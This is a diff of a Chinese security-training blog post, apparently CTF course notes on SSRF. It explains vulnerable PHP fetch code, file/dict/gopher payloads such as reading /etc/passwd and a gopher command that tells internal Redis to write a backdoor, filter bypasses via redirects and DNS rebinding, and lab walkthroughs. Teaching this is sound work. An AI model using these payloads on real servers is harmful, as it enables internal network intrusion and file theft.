@@ -165,7 +165,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://hnu-legend1440.com/2026/01/21/%E7%AC%AC%E4%B8%83%E7%AB%A0-PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+    <link itemprop="mainEntityOfPage" href="http://hnu-legend1440.com/2026/12/09/%E7%AC%AC%E5%85%AB%E7%AB%A0-SSRF%E6%BC%8F%E6%B4%9E/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -179,7 +179,7 @@
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
           
-            <a href="/2026/01/21/%E7%AC%AC%E4%B8%83%E7%AB%A0-PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="post-title-link" itemprop="url">第七章-PHP反序列化</a>
+            <a href="/2026/12/09/%E7%AC%AC%E5%85%AB%E7%AB%A0-SSRF%E6%BC%8F%E6%B4%9E/" class="post-title-link" itemprop="url">第八章-SSRF漏洞</a>
         </h2>
 
         <div class="post-meta">
@@ -188,10 +188,280 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
-              
 
-              <time title="创建时间：2026-01-21 01:49:30 / 修改时间：01:51:19" itemprop="dateCreated datePublished" datetime="2026-01-21T01:49:30+08:00">2026-01-21</time>
+              <time title="创建时间：2026-12-09 12:00:00" itemprop="dateCreated datePublished" datetime="2026-12-09T12:00:00+08:00">2026-12-09</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2026-01-21 01:53:36" itemprop="dateModified" datetime="2026-01-21T01:53:36+08:00">2026-01-21</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/training/" itemprop="url" rel="index"><span itemprop="name">-training</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>飞书链接:<a target="_blank" rel="noopener" href="https://icnewi51k2yp.feishu.cn/wiki/KTLBwFFFkigQbpkPUZTc5egEnCc?from=from_copylink">https://icnewi51k2yp.feishu.cn/wiki/KTLBwFFFkigQbpkPUZTc5egEnCc?from=from_copylink</a></p>
+<h1 id="Week9-1-SSRF-漏洞绪论"><a href="#Week9-1-SSRF-漏洞绪论" class="headerlink" title="[Week9.1]SSRF 漏洞绪论"></a>[Week9.1]SSRF 漏洞绪论</h1><h3 id="SSRF-漏洞简介"><a href="#SSRF-漏洞简介" class="headerlink" title="SSRF 漏洞简介"></a>SSRF 漏洞简介</h3><h4 id="核心定义"><a href="#核心定义" class="headerlink" title="核心定义"></a>核心定义</h4><p>SSRF &#x3D; 服务器端请求伪造 → <strong>你让服务器替你发请求</strong>，服务器能访问的资源（本地文件、内网服务），你自己访问不了，但通过 SSRF 就能 “借服务器的手” 拿到。</p>
+<h4 id="类比示例"><a href="#类比示例" class="headerlink" title="类比示例"></a><strong>类比示例</strong></h4><p>你想去邻居家（服务器内网）偷东西，但你进不去（你直接访问不了内网）；你骗物业（服务器）：“帮我去邻居家拿个快递”（构造 SSRF 请求）；物业有钥匙（服务器能访问内网），真的去邻居家帮你拿了（服务器执行请求，返回结果给你）；→ 你没进门，却拿到了邻居家的东西 &#x3D; SSRF 攻击成功。</p>
+<h4 id="技术层面示例"><a href="#技术层面示例" class="headerlink" title="技术层面示例"></a>技术层面示例</h4><p>靶机有个文件读取接口：<code>http://靶机/fetch.php?url=xxx</code>，功能是 “服务器根据你传的 url，去获取内容并返回给你”。</p>
+<ul>
+<li>正常用法：你传 <code>url=``https://www.baidu.com</code> → 服务器帮你爬百度页面，返回给你；</li>
+<li>SSRF 攻击：你传 <code>url=file:///var/www/html/flag.php</code> → 服务器帮你读它本地的 flag.php，把内容返回给你（你自己直接访问不到这个文件）；</li>
+<li>关键：服务器的权限远大于你，它能访问自己的本地文件、内网机器，你通过 SSRF 就能 “蹭” 它的权限。</li>
+</ul>
+<p><img src="/images/P5eCbhdtso6d5xxakydcZrmRnJh.png"></p>
+<h3 id="SSRF-核心应用场景"><a href="#SSRF-核心应用场景" class="headerlink" title="SSRF 核心应用场景"></a>SSRF 核心应用场景</h3><p><img src="/images/UGo8bjjdAogbpCx6Ocxcer2BnWa.png"></p>
+<h4 id="场景-1：读取服务器本地文件"><a href="#场景-1：读取服务器本地文件" class="headerlink" title="场景 1：读取服务器本地文件"></a>场景 1：读取服务器本地文件</h4><p>用 <code>file://</code> 协议，让服务器读它自己的文件：</p>
+<ul>
+<li>测试 Payload：<code>http://靶机/fetch.php?url=file:///etc/passwd</code>（&#x2F;etc&#x2F;passwd 是 Linux 系统必有的文件，能读到说明 SSRF 存在）；</li>
+<li>拿 flagPayload：<code>http://靶机/fetch.php?url=file:///var/www/html/flag.php</code>（根据题目提示的 flag 路径调整）；</li>
+</ul>
+<h4 id="场景-2：探测内网服务"><a href="#场景-2：探测内网服务" class="headerlink" title="场景 2：探测内网服务"></a>场景 2：探测内网服务</h4><p>服务器内网可能有隐藏的服务（比如数据库、后台管理页），你直接访问不了，但服务器能访问：</p>
+<ul>
+<li>测试内网 IP：<code>http://靶机/fetch.php?url=``http://192.168.1.101:80</code>（看是否能访问内网 101 机器的 80 端口）；</li>
+<li>测试本地端口：<code>http://靶机/fetch.php?url=``http://127.0.0.1:3306</code>（看本地是否开了 MySQL 服务）；</li>
+</ul>
+<h4 id="场景-3：攻击内网服务（了解即可）"><a href="#场景-3：攻击内网服务（了解即可）" class="headerlink" title="场景 3：攻击内网服务（了解即可）"></a>场景 3：攻击内网服务（了解即可）</h4><p>如果内网服务有漏洞（比如 Redis 未授权访问），通过 SSRF 让服务器去攻击内网服务：</p>
+<ul>
+<li>例子：<code>http://靶机/fetch.php?url=gopher://127.0.0.1:6379/_CONFIG SET dir /var/www/html</code>（让服务器给内网 Redis 发命令，写后门文件）；</li>
+</ul>
+<h3 id="前置知识-NAT"><a href="#前置知识-NAT" class="headerlink" title="前置知识 NAT"></a>前置知识 NAT</h3><p>NAT(Network Address Translation)</p>
+<p>网络地址转换</p>
+<p>通过将一个外部 IP 地址和端口映射到</p>
+<p>更大的内部 IP 地址集来转换 IP 地址。</p>
+<p><img src="/images/Ltp9bUkt8ovsZzxzMDOcb6g8n4b.png"></p>
+<h3 id="漏洞举例"><a href="#漏洞举例" class="headerlink" title="漏洞举例"></a>漏洞举例</h3><p>我们正常访问 127.0.0.1&#x2F;flag.php 是没办法访问的，但题目中有特定程序处理 URL 参数，并以服务器的高权限身份访问到了这一(可能是内网)的内容</p>
+<p><img src="/images/U373bvAkZoA5mFxUm7lclniDnJl.png"></p>
+<h1 id="Week9-2-SSRF-漏洞利用"><a href="#Week9-2-SSRF-漏洞利用" class="headerlink" title="[Week9.2]SSRF 漏洞利用"></a>[Week9.2]SSRF 漏洞利用</h1><p><em>注:SSRF 靶场在本节作为例题出现过的，本章实验就不会再出现了</em></p>
+<h2 id="认识-127-0-0-1"><a href="#认识-127-0-0-1" class="headerlink" title="认识 127.0.0.1"></a>认识 127.0.0.1</h2><p><code>127.0.0.1</code> 是服务器的<strong>本地回环地址，是只在服务器本机生效的 IP</strong>，数据不会走外网，只有服务器自己能访问这个地址对应的资源，你如果不用服务器的程序代码，而是直接用浏览器 URL 访问 <code>127.0.0.1</code>，访问的是你自己的电脑，不是靶机服务器的</p>
+<p><img src="/images/KfjGbVjbMoEGasxunnscEiDTnee.png"></p>
+<h2 id="SSRF-重要函数"><a href="#SSRF-重要函数" class="headerlink" title="SSRF 重要函数"></a>SSRF 重要函数</h2><h3 id="file-get-contents-与-readfile"><a href="#file-get-contents-与-readfile" class="headerlink" title="file_get_contents() 与 readfile()"></a>file_get_contents() 与 readfile()</h3><p><code>file_get_contents</code> 这一函数是把 <strong>传入的参数(变量)</strong> 写入字符串，当把 <strong>传参</strong> 是内网文件的时候，会先去把这个文件的内容读出来再写入，导致了任意文件读取，也就是信息泄露的一种。一般这种攻击也与目录遍历相结合。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ssrf.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Rj2SbZEY4oPtEpx8bf9cZ0Fqnjg.png"></p>
+<h3 id="fsockopen"><a href="#fsockopen" class="headerlink" title="fsockopen()"></a>fsockopen()</h3><p><code>fsockopen($hostname,$port,$errno,$errstr,$timeout)</code>  用于打开一个网络连接或者一个 Unix 套接字连接，初始化一个套接字连接到指定主机（hostname），实现对用户指定 url  数据的获取。该函数会使用 socket 跟服务器建立 tcp 连接，进行传输原始数据。 fsockopen()  将返回一个文件句柄，之后可以被其他文件类函数调用 <code>（例如：fgets()，fgetss()，fwrite()，fclose()还有feof()）</code> 如果调用失败，将返回 false。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ssrf.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$host</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$fp</span> = <span class="title function_ invoke__">fsockopen</span>(<span class="variable">$host</span>, <span class="number">80</span>, <span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="number">30</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$fp</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$errstr</span> (<span class="subst">$errno</span>)&lt;br /&gt;\n&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$out</span> = <span class="string">&quot;GET / HTTP/1.1\r\n&quot;</span>;</span><br><span class="line">    <span class="variable">$out</span> .= <span class="string">&quot;Host: <span class="subst">$host</span>\r\n&quot;</span>;</span><br><span class="line">    <span class="variable">$out</span> .= <span class="string">&quot;Connection: Close\r\n\r\n&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="variable">$out</span>);</span><br><span class="line">    <span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$fp</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">fgets</span>(<span class="variable">$fp</span>, <span class="number">128</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="curl-exec"><a href="#curl-exec" class="headerlink" title="curl_exec()"></a>curl_exec()</h3><p>curl_init(url) 函数初始化一个新的会话，返回一个 cURL 句柄，供 <code>curl_setopt()，curl_exec()和curl_close()</code> 函数使用。</p>
+<p><em>注:</em><strong>cURL 句柄就是你给 cURL 工具 “开的一个专属操作窗口”</strong>_ —— 你要让 cURL 帮你发 HTTP&#x2F;HTTPS&#x2F;FTP 等请求，得先 “开一个窗口（创建句柄）”，在这个窗口里设置请求的 URL、请求方法、头信息等参数，让 cURL 按你的要求干活，干完活再 “关掉这个窗口（关闭句柄）”。_</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">// 1. 检测URL中是否传入了名为url的GET参数（核心触发条件）</span></span><br><span class="line"><span class="comment">// 比如访问 http://localhost/ssrf.php?url=http://127.0.0.1/flag.php 时，该条件成立</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">// 2. 将GET参数url的值赋值给变量$link，后续作为cURL请求的目标地址</span></span><br><span class="line">    <span class="comment">// $link就是攻击者可控的核心参数，也是SSRF漏洞的入口</span></span><br><span class="line">        <span class="variable">$link</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 3. 初始化cURL会话，返回一个cURL句柄（资源类型）</span></span><br><span class="line">        <span class="comment">// 句柄是后续配置cURL请求、执行请求的唯一标识，所有操作都基于这个句柄</span></span><br><span class="line">        <span class="variable">$curlobj</span> = <span class="title function_ invoke__">curl_init</span>(); </span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 4. 设置cURL参数：强制使用GET请求（禁用POST）</span></span><br><span class="line">        <span class="comment">// CURLOPT_POST=0 表示请求方法为GET；若设为1则为POST请求</span></span><br><span class="line">        <span class="comment">// 该配置限制了请求方法，但不影响SSRF的核心利用（GET已足够访问文件/内网）</span></span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curlobj</span>, CURLOPT_POST, <span class="number">0</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 5. 设置cURL的核心参数：指定要请求的目标URL</span></span><br><span class="line">        <span class="comment">// 将攻击者可控的$link作为请求地址，这是SSRF的关键——服务器会按这个地址发送请求</span></span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curlobj</span>,CURLOPT_URL,<span class="variable">$link</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 6. 设置cURL参数：将请求结果以字符串返回，而非直接输出到浏览器</span></span><br><span class="line">        <span class="comment">// 若不设该参数，curl_exec()会直接把结果打印到页面，设为1则可将结果存入变量$result</span></span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curlobj</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>); </span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 7. 执行cURL会话：根据上述配置发送请求，并获取响应结果</span></span><br><span class="line">        <span class="comment">// 服务器会代替攻击者访问$link指定的地址（本地文件/内网服务/外网），并把响应内容赋值给$result</span></span><br><span class="line">        <span class="comment">// 这一步是SSRF漏洞的核心执行过程：服务器主动发起请求，获取目标资源</span></span><br><span class="line">        <span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$curlobj</span>); </span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 8. 关闭cURL句柄，释放系统资源（避免内存泄漏）</span></span><br><span class="line">        <span class="comment">// 执行完请求后必须关闭句柄，是cURL使用的规范操作</span></span><br><span class="line">        <span class="title function_ invoke__">curl_close</span>(<span class="variable">$curlobj</span>); </span><br><span class="line"> </span><br><span class="line">        <span class="comment">// 以下两行是被注释的代码，原本功能是将请求结果写入本地文件（可忽略）</span></span><br><span class="line">        <span class="comment">// $filename = &#x27;./curled/&#x27;.rand().&#x27;.txt&#x27;; // 生成随机文件名，避免重复</span></span><br><span class="line">        <span class="comment">// file_put_contents($filename, $result); // 将$result写入本地文件</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 9. 输出cURL请求的结果到浏览器</span></span><br><span class="line">        <span class="comment">// 攻击者可通过这一步获取服务器请求$link后的响应内容（比如本地flag文件、内网服务信息）</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>我们可以通过 <code>file、dict、gopher</code> 这三个协议来进行渗透，提高 <code>curl_exec()</code> 这里的攻击危害。</p>
+<p>下见危险协议</p>
+<h2 id="SSRF-信息收集伪协议"><a href="#SSRF-信息收集伪协议" class="headerlink" title="SSRF 信息收集伪协议"></a>SSRF 信息收集伪协议</h2><h3 id="File-伪协议"><a href="#File-伪协议" class="headerlink" title="File 伪协议"></a>File 伪协议</h3><p>file:&#x2F;&#x2F;从文件系统中获取文件内容，格式为 file:&#x2F;&#x2F;[文件路径]</p>
+<p>这些是常使用的文件名读取</p>
+<p><img src="/images/MRNtbeQq0oqgBOxP8Exc5T9Entd.png"></p>
+<p>file 伪协议的用途一般是查找内网存活主机，这里涉及到对 arp 和 burp 爆破的应用，这里暂不叙述，CTF 解题时若遇到再进行举例</p>
+<p>大致就是，先用 burp 爆破所有想查询的范围</p>
+<p><img src="/images/QZesbMZCjoTTMpxkwizcfoMwnsh.png"></p>
+<p>然后如下访问 arp 缓存表</p>
+<p><img src="/images/ANJYb93uDoL9nSxtDtNcZReqnJb.png"></p>
+<p>扫到一个这样的表，观察圈起来的这一列与众不同的就是打开的主机了</p>
+<p><img src="/images/XTjwbvuYVof40mxk1hRcgyDrnze.png"></p>
+<h4 id="实验举例-hello-ssrf-Level1"><a href="#实验举例-hello-ssrf-Level1" class="headerlink" title="[实验举例]hello-ssrf-Level1"></a>[实验举例]hello-ssrf-Level1</h4><p>使用服务器提供的请求来读取根目录下 flag 文件</p>
+<p><img src="/images/KdNgbWgWxoNo6Wx50A4cZIRbnjw.png"></p>
+<h3 id="Dict-伪协议-端口扫描"><a href="#Dict-伪协议-端口扫描" class="headerlink" title="Dict 伪协议(端口扫描)"></a>Dict 伪协议(端口扫描)</h3><p>利用 <code>dict</code> 协议，<code>dict://&lt;ip&gt;/info</code> 可获取本地 <code>redis</code> 服务配置信息。</p>
+<p>对后续漏洞(查找内网主机开放端口等)有所帮助</p>
+<h4 id="实验举例-hello-ssrf-Level2"><a href="#实验举例-hello-ssrf-Level2" class="headerlink" title="[实验举例]hello-ssrf-Level2"></a>[实验举例]hello-ssrf-Level2</h4><p>SSRF 中的端口探测，我们常用 <code>dict</code> 协议进行端口扫描.</p>
+<p><img src="/images/GZDfb2I02o010cxnWKmcAfFon2f.png"></p>
+<p>我们可以先输一输 80 端口，看下请求有结果不</p>
+<p><img src="/images/OFDMbkGTror3XfxUVMPcnBIKnSc.png"></p>
+<p>会显示结果，再输一次 80 端口，打开 burp 拦截</p>
+<p><img src="/images/ZyGvbM5rDoJy0yxgXn9czSAMnlh.png"></p>
+<p>右键，发送到 intruder 进行爆破</p>
+<p>选择单个 payload 狙击手 框选 80 点击添加 payload 位置</p>
+<p><img src="/images/Da3Ybpc7MoMmIrxtHG7c7Qsanke.png"></p>
+<p>payload 界面:</p>
+<p>payload 类型选择数值，范围按照题目给的 1 到 1 万</p>
+<p><img src="/images/BmwlbVnNNoOy5zxbJpwcFMh2ngc.png"></p>
+<p>按照题目所说:dict:&#x2F;&#x2F;ip:prot”当遇到开放端口时，响应速度会明显变慢</p>
+<p>观察一下爆破结果，哪些端口响应速度比较慢</p>
+<p>点击列，手动添加这两列</p>
+<p><img src="/images/WJewbuOuyo9fI7xs8zZcVlRGnpg.png"></p>
+<p>爆破完毕后应该有一万条结果，看看哪些时间比较长，比如图中的 9001 端口</p>
+<p>我们再手动把端口输进去，查询结果发现是旗帜的一部分</p>
+<p><img src="/images/OSbrbUGNooXbtExiGRjcM9uXnmc.png"></p>
+<p>把五个端口全部找到，便可以获得完整的旗帜了</p>
+<p><img src="/images/OGeYbi4mRoozPQx29f0cra2Dnrc.png"></p>
+<p>flag{222279809ec64168a5790fd9a6088e1f}</p>
+<h3 id="Http-协议"><a href="#Http-协议" class="headerlink" title="Http 协议"></a><strong>Http 协议</strong></h3><p>作用：常规 URL 形式，允许通过 HTTP1.0 的 GET 方法，以只读访问文件或资源，<strong>即进行目录扫描</strong>。</p>
+<p>此外你要进行 post 提交和 get 提交你必须用 http 协议</p>
+<p>CTF 中通常用于远程包含。</p>
+<p><img src="/images/M3J1bvxXmoyghXxVCVXcN6O6nPc.png"></p>
+<p>使用 Burp 爆破 +http 伪协议读特定的(未知名称的)php 文件</p>
+<p><img src="/images/ITCqb3dpjoXhvoxoqWqc56POnLb.png"></p>
+<h3 id="gopher-协议-POST-提交数据"><a href="#gopher-协议-POST-提交数据" class="headerlink" title="gopher 协议(POST 提交数据)"></a>gopher 协议(POST 提交数据)</h3><p>假如我们想要用 SSRF 访问无权限访问的 php 文件，还想 post 或 get 提交数据，对于 get，可以直接用 http 协议解决，</p>
+<p>对于 post，则需要用 gopher 协议</p>
+<p><img src="/images/V2iBbUYQ5oLH26xKG5UcEcpznVb.png"></p>
+<p><strong>用 gopher 协议进行 get 提交</strong></p>
+<p>头部信息可以使用 Burp 抓包获得</p>
+<p><img src="/images/DL7MblqJsoo606xYpwecq4SdnOb.png"></p>
+<p><img src="/images/KDmVbM6Rbo3rjRx4RsIctu8mnzc.png"></p>
+<p>注意最后需要增加一个换行符</p>
+<p><strong>用 gopher 协议进行 post 提交</strong></p>
+<p>POST 则需要保留更多的头部信息，并且图中缺了必要的路径和目标 ip 地址，我们应该像 get 一样加上</p>
+<p><img src="/images/AGNvbQiqyoL9wuxHAHXc60JNnQb.png"></p>
+<p>其中后面两点和你 post 提交的内容相关联</p>
+<p>字符转换前在 post 前另起两行</p>
+<p><img src="/images/H6SkbufXToPXMPx2wENcIv2Fnrd.png"></p>
+<h2 id="SSRF-绕过过滤"><a href="#SSRF-绕过过滤" class="headerlink" title="SSRF 绕过过滤"></a>SSRF 绕过过滤</h2><p>第二第三个过滤都不太容易实操，先了解一下吧</p>
+<h3 id="127-0-0-1-过滤绕过-环回地址绕过"><a href="#127-0-0-1-过滤绕过-环回地址绕过" class="headerlink" title="127.0.0.1 过滤绕过(环回地址绕过)"></a>127.0.0.1 过滤绕过(环回地址绕过)</h3><p><img src="/images/P0wrbmABKoMPxhxhnf3cYB4In9f.png"></p>
+<p>有的题目会限制 127.0.0.1 的访问，可以更换别的表达方式</p>
+<p><img src="/images/AN24baomRoyEiAxPnEzcM5ckn7g.png"></p>
+<p><img src="/images/JOKsbnblHojLlOxW7KxcyxIznsg.png"></p>
+<p>还有一些其他的方法，这里暂不赘述(进制是最好用的)</p>
+<p><a target="_blank" rel="noopener" href="https://drun1baby.top/2022/05/16/%E4%BB%8E0%E5%88%B01%E5%AE%8C%E5%85%A8%E6%8E%8C%E6%8F%A1SSRF">https://drun1baby.top/2022/05/16/%E4%BB%8E0%E5%88%B01%E5%AE%8C%E5%85%A8%E6%8E%8C%E6%8F%A1SSRF</a></p>
+<p>经过做题，发现 127.0.0.2 和单独的一个 0 也适用，后面这些也有可能奏效</p>
+<p><img src="/images/AaQCbyVEEoBOZmxAydAcFTu5n2c.png"></p>
+<p>还有 ipv6– ::1 等价于 127.0.0.1</p>
+<h3 id="302-重定向绕过"><a href="#302-重定向绕过" class="headerlink" title="302 重定向绕过"></a>302 重定向绕过</h3><p>SSRF 的 302 重定向绕过，就是出题人给 SSRF 加了 “黑名单过滤”（比如禁止访问 127.0.0.1、file:&#x2F;&#x2F; 协议），你直接传 <code>127.0.0.1/flag</code> 会被拦，但你可以先搭一个 “中转服务器”，让目标服务器访问你的中转服务器时触发 302 重定向，偷偷跳转到被禁止的地址（比如 127.0.0.1&#x2F;flag），绕开黑名单检测</p>
+<p><img src="/images/IAobb8V7yo8QwOxa8Vjc71hEnPg.png"></p>
+<h4 id="步骤-1：搭你的-302-重定向中转服务器（用-PHP-Python-都可以）"><a href="#步骤-1：搭你的-302-重定向中转服务器（用-PHP-Python-都可以）" class="headerlink" title="步骤 1：搭你的 302 重定向中转服务器（用 PHP&#x2F;Python 都可以）"></a>步骤 1：搭你的 302 重定向中转服务器（用 PHP&#x2F;Python 都可以）</h4><p>这里用最简单的 PHP 写 <code>redirect.php</code>（放到你的公网服务器 &#x2F; 本地穿透地址）：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 核心：返回302状态码，并重定向到被禁止的地址（比如127.0.0.1/flag）</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: http://127.0.0.1/flag&quot;</span>); <span class="comment">// 要跳转的目标地址（题目里被禁的）</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;HTTP/1.1 302 Moved Temporarily&quot;</span>); <span class="comment">// 发送302重定向响应</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><em>(解释：谁访问这个__redirect.php</em><em>，谁就会被 302 重定向到__127.0.0.1&#x2F;flag</em><em>。)</em></p>
+<h4 id="步骤-2：构造-SSRF-Payload（传给靶机）"><a href="#步骤-2：构造-SSRF-Payload（传给靶机）" class="headerlink" title="步骤 2：构造 SSRF Payload（传给靶机）"></a>步骤 2：构造 SSRF Payload（传给靶机）</h4><p>靶机的 SSRF 接口是 <code>ssrf.php?url=</code>，你传：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://靶机IP/ssrf.php?url=http://你的服务器IP/redirect.php</span><br></pre></td></tr></table></figure>
+
+<h4 id="步骤-3：靶机的执行过程"><a href="#步骤-3：靶机的执行过程" class="headerlink" title="步骤 3：靶机的执行过程"></a>步骤 3：靶机的执行过程</h4><ol>
+<li>靶机检测你传的 URL：<code>http://你的服务器IP/redirect.php</code> → 不含 127.0.0.1，通过黑名单；</li>
+<li>靶机用 cURL 访问你的 <code>redirect.php</code> → 你的服务器返回 302，告诉靶机 “去访问 127.0.0.1&#x2F;flag”；</li>
+<li>靶机的 cURL 默认会跟随 302 跳转（因为代码里通常有 <code>CURLOPT_FOLLOWLOCATION=true</code>），直接访问 <code>127.0.0.1/flag</code>；</li>
+<li>靶机读取 flag 内容，返回给你 → 绕过成功！</li>
+</ol>
+<h3 id="DNS-重绑定绕过"><a href="#DNS-重绑定绕过" class="headerlink" title="DNS 重绑定绕过"></a>DNS 重绑定绕过</h3><p>不太容易实操，放一张图吧</p>
+<p><img src="/images/VwISbh10JoS0LZxtHaLcLMISnVV.png"></p>
+<p>使用第三方工具利用解析间隙重改 ip</p>
+<p><a target="_blank" rel="noopener" href="https://lock.cmpxchg8b.com/rebinder.html">https://lock.cmpxchg8b.com/rebinder.html</a></p>
+<p>A,B 分别输合法 ip，不合法 ip，访问新生成的网址即可</p>
+<p><em>效果类比：你访问 <strong>wwfcww.xyz</strong> 这个域名，第一次解析的 IP 是 192.168.0.1；而第二次解析的 IP 是 127.0.0.1，如此一来即可进行 SSRF 攻击。</em></p>
+<p>第三节第二个实验已经有举例了，复习的时候可以看看</p>
+<p><a target="_blank" rel="noopener" href="https://hnusec-star.feishu.cn/wiki/QmDhwYaO1iCfZwkQqHycUtNzngP#share-OOjgd2U0bokiGhxMHXFcFQ4knPe">[Week9.3]实验:SSRF 漏洞实践</a></p>
+<h1 id="Week9-3-实验-SSRF-漏洞实践"><a href="#Week9-3-实验-SSRF-漏洞实践" class="headerlink" title="[Week9.3]实验:SSRF 漏洞实践"></a>[Week9.3]实验:SSRF 漏洞实践</h1><h2 id="newstarctf2025-MyGO"><a href="#newstarctf2025-MyGO" class="headerlink" title="newstarctf2025 MyGO!!!"></a>newstarctf2025 MyGO!!!</h2><p>拿到题目发现没什么回显，右击查看源码</p>
+<p><img src="/images/SmDFbSX7Wo3NVYxfK9ic3BXinGf.png"></p>
+<p>应该每个按钮相当于给 url 赋了值，红框框的地方也很可疑，照这样 payload 看看先</p>
+<p><img src="/images/VUFYbzz0co5COTxK7SDcZUjYnpb.png"></p>
+<p>回显 提示错误 URL</p>
+<p><img src="/images/RSt9b7q6SoYBVFxDG38ctTB1n2b.png"></p>
+<p>源码中 flag 的 URL 是 <a target="_blank" rel="noopener" href="http://localhost/">http://localhost/</a>??? 先试试 flag.php</p>
+<p>回显了一道新题</p>
+<p><img src="/images/QKgkb7qYmoL1plxhczycejqunbg.png"></p>
